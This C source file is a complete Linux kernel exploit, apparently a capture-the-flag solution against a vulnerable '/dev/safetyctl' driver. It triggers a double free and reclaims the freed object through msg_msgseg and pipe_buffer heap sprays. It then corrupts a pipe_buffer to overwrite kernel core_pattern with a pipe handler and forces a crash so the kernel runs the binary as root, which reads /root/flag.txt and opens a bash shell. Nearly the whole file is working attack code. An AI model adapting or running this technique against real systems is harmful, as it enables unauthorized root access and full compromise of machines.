#define _GNU_SOURCE
#define _GNU_SOURCE
#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <stdbool.h>
#include <stdarg.h>
#include <sched.h>
#include <sys/syscall.h>
#include <sys/stat.h>
#include <sys/shm.h>
#include <sys/xattr.h>
#include <sys/mount.h>
#include <fcntl.h>
#include <unistd.h>
#include <linux/mount.h>
#include<error.h>
#include<keyutils.h>
#include<assert.h>
#include <sys/auxv.h>
#include <sys/timerfd.h>
#include <sys/types.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/socket.h>
#include <sys/sendfile.h>
#include <sys/mman.h>




#define KEY_SZ 0x8
#define SUCCESS 0x1000
#define INFO 0x1001
#define ERROR 0x1010


void logger(int type, char *string)
{
    switch (type)
    {
    case SUCCESS:
        printf("[+] %s\n", string);
        break;
    case INFO:
        printf("[!] %s\n", string);
        break;
    case ERROR:
        printf("[-] %s\n", string);
        break;
    }
}

unsigned long user_cs, user_ss, user_rsp, user_rflags;
key_serial_t keys[KEY_SZ];
int cfd[2];
char _msg[10];

void claim_with_user_key()
{
    logger(INFO, "Claiming with user_key_payload");
    char buffer[50];
    memset(buffer, 'K', 50);
    for(int idx = 0; idx < KEY_SZ; idx++)
    {
        keys[idx] = add_key("user", "user", buffer, 50, KEY_SPEC_PROCESS_KEYRING);
    }
}
static void save_state() {
  asm(
      "movq %%cs, %0\n"
      "movq %%ss, %1\n"
      "movq %%rsp, %2\n"
      "pushfq\n"
      "popq %3\n"
      : "=r"(user_cs), "=r"(user_ss), "=r"(user_rsp), "=r"(user_rflags)
      :
      : "memory");
}

void set_cpu(int cpuid)
{
	cpu_set_t my_set;
	CPU_ZERO(&my_set);
	CPU_SET(cpuid, &my_set);
	assert(sched_setaffinity(0, sizeof(my_set), &my_set) == 0);
}

struct _msgbuf {
    long mtype;
    char mtext[4096 - 48 + 96 - 8];
};
#define MSG_SZ 10
int msg_que[MSG_SZ];
void handle_msg()
{
    logger(INFO, "Reclaiming the password object with the struct msg_msgseg");
    char buffer[4096 - 48 + 96 - 8];
    memset(buffer, 'M', sizeof(buffer));
    for(int idx=0; idx < MSG_SZ; idx++)
    {
        struct _msgbuf msg;
        msg.mtype = 1;
        memcpy(msg.mtext, buffer, sizeof(buffer));
        msg_que[idx] = msgget(IPC_PRIVATE, 0664 | IPC_CREAT);
        if(msg_que[idx] < 0){
            logger(ERROR, "msgget failed");
            exit(-1);
        }

        int rv = msgsnd(msg_que[idx], &msg, sizeof(buffer), IPC_NOWAIT);
        if(rv < 0)
        {
            logger(ERROR, "msgsnd failed");
            exit(-1);
        }
    }
    
}

#define PIPE_LEN 10
int pipes[PIPE_LEN][2];
void claim_with_pipe()
{
    void *addr = (void *)getauxval(AT_SYSINFO_EHDR);
    struct iovec x; 
    x.iov_base = addr;
    x.iov_len = 1;
    char pipe_buffer_data[4096];
    memset(pipe_buffer_data, 'A', 0x1000);
    logger(INFO, "Reclaiming the object with the struct pipe_buffer");
    for(int idx = 0; idx < PIPE_LEN; idx++)
    {
        int rv = pipe(pipes[idx]);
        if(rv < 0)
        {
            logger(ERROR, "pipe fail");
        }
        rv = fcntl(pipes[idx][1], F_SETPIPE_SZ, 0x2000);
        if(rv < 0)
        {
            logger(ERROR, "fcntl fail");
        }
        // write(pipes[idx][1], pipe_buffer_data, 0x1000); //offset.
        rv = vmsplice(pipes[idx][1], &x, 1, 0);
                if(rv < 0)
        {
            logger(ERROR, "vmsplice fail");
        }
    }
}
struct pipe_buffer
{
	void *page;
	unsigned int offset, len;
	void *ops;
	unsigned int flags;
};

void verify_pipe_claim(int fd)
{
    char recv[96];
    logger(INFO, "Checking the claims");
    read(fd, recv, 96);
    struct pipe_buffer *p = (void *)(recv);
    if(p-> len == 1 )
    {
        logger(SUCCESS, "Leaked Pipe is as follow");
        printf("page: %p\n", p->page);
        printf("offset: %d\n", p->offset);
        printf("ops: %p\n", p->ops);
        printf("len: %d\n", p->len);
        p->flags = 0x10;
        p->offset = 0xd40 - 1;
        p->page += (0x2ded40 >> 6);
        write(fd, recv, 96);
        for(int idx = 0; idx < PIPE_LEN; idx++)
        {
            int rv = write(pipes[idx][1],"|/proc/%P/fd/666 %P\n", 21);
            if(rv < 0)
            {
                exit(-1);
            }
        }
        system("cat /proc/sys/kernel/core_pattern");
        logger(SUCCESS, "Core Pattern overwritten");
        
        write(cfd[1], _msg, 1); //signal for the crash
    }

}
void root(char *buf)
{
	int pid = strtoull(buf, 0, 10);
	char path[0x100];
	// fix stdin, stdout, stderr
	sprintf(path, "/proc/%d/ns/net", pid);
	int pfd = syscall(SYS_pidfd_open, pid, 0);
	int stdinfd = syscall(SYS_pidfd_getfd, pfd, 0, 0);
	int stdoutfd = syscall(SYS_pidfd_getfd, pfd, 1, 0);
	int stderrfd = syscall(SYS_pidfd_getfd, pfd, 2, 0);
	dup2(stdinfd, 0);
	dup2(stdoutfd, 1);
	dup2(stderrfd, 2);
	// just cat the flag
	system("cat /root/flag.txt;bash");
}
int main(int argc, char **argv) {
    
    if (argc > 1)
	{
		root(argv[1]);
		exit(0);
	}
    
    setvbuf(stdin, NULL, _IONBF, 0);
    // Disable buffering for stdout
    setvbuf(stdout, NULL, _IONBF, 0);

    socketpair(AF_UNIX, SOCK_STREAM, 0, cfd);
	if (fork() == 0)
	{
		int memfd = memfd_create("x", 0);
		sendfile(memfd, open("/proc/self/exe", 0), 0,
						0xffffffff);
		dup2(memfd, 666);
		close(memfd);
		// wait signal of the finished exploit
		read(cfd[0], _msg, 1);
		// trigger crash
		*(size_t *)0 = 0;
	}
    logger(INFO, "Saving state");
    save_state();
    set_cpu(0x1);
    logger(INFO, "Allocating the vulnerable object");
    int fd = open("/dev/safetyctl", O_RDWR);
    char pass[96];
    memset(pass, 'P', sizeof(pass));
    write(fd, pass, 96);
    logger(INFO, "Triggering the freeees");
    read(fd, pass, 96);
    handle_msg();
    logger(INFO, "Triggering the second free");
    read(fd, pass, 96);  //free again
    memset(pass, 0, 0x8); //reset the bloody msg_msgseg->next to null;
    write(fd, pass, 96);
    struct _msgbuf msg;
    
    for(int idx = 0; idx < MSG_SZ; idx++) // fuck the msg_msgseg
    {
        int rv = msgrcv(msg_que[idx], &msg, sizeof(msg.mtext), 1, IPC_NOWAIT);
        if(rv < 0)
        {
            logger(ERROR, "failed at msgrcv");
            exit(-1);
        }
    }
    claim_with_pipe();
    verify_pipe_claim(fd);
    while(1)
        sleep(100);
    return 0;
}